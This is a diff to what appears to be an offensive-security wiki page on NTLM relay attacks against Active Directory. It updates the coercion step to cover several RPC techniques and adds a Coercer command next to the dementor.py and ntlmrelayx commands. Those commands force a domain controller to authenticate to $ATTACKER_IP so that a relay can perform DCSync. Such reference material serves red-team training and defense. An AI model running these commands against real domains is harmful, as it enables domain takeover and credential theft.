@@ -34,9 +34,13 @@ In order to operate the attack, the [Impacket](https://github.com/SecureAuthCorp
 ntlmrelayx -t dcsync://$DC_HOST_2 -smb2support
 ```
 
-Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). One way of doing this is to rely on the [PrinterBug](../mitm-and-coerced-authentications/ms-rprn.md).
+Once the relay servers are up and running and waiting for incoming traffic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). Any [RPC coercion technique](../mitm-and-coerced-authentications/rpc-coercions/ms-rprn.md) can be used for this purpose (e.g. [MS-RPRN](../mitm-and-coerced-authentications/rpc-coercions/ms-rprn.md), [MS-EFSR](../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md), [MS-DFSNM](../mitm-and-coerced-authentications/rpc-coercions/ms-dfsnm.md), [MS-FSRVP](../mitm-and-coerced-authentications/rpc-coercions/ms-fsrvp.md)).
 
 ```bash
+# Using Coercer (supports multiple RPC methods)
+coercer coerce -t $DC_HOST_1 -l $ATTACKER_IP -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
+
+# Or using a specific method (e.g. MS-RPRN)
 dementor.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST_1"
 ```
 
